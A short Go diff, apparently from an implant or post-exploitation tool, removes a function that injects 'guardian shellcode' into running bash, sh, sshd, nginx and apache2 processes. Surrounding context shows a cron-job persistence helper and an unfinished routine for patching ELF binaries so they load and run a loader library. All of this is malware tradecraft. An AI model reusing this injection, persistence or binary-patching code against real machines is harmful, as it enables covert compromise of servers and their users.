@@ -194,34 +194,6 @@ func AddCronJob(job string) error {
 	return cmd.Start()
 }
 
-// Inject guardian shellcode into running processes
-func injector() (err error) {
-	// find some processes to inject
-	procs := util.PidOf("bash")
-	procs = append(procs, util.PidOf("sh")...)
-	procs = append(procs, util.PidOf("sshd")...)
-	procs = append(procs, util.PidOf("nginx")...)
-	procs = append(procs, util.PidOf("apache2")...)
-
-	// inject to all of them
-	for _, pid := range procs {
-		go func(pid int) {
-			if pid == 0 {
-				return
-			}
-			title := fmt.Sprintf("%s (%d)", util.ProcCmdline(pid), pid)
-			// prepare shellcode
-			shellcode, _ := prepare_sc(pid)
-			inject_err := ShellcodeInjector(&shellcode, pid)
-			if inject_err != nil {
-				err = fmt.Errorf("%v; %s: %v", err, title, inject_err)
-				return
-			}
-		}(pid)
-	}
-	return
-}
-
 // FIXME this is not working
 // patch ELF file so it automatically loads and runs loader.so
 func patcher() (err error) {
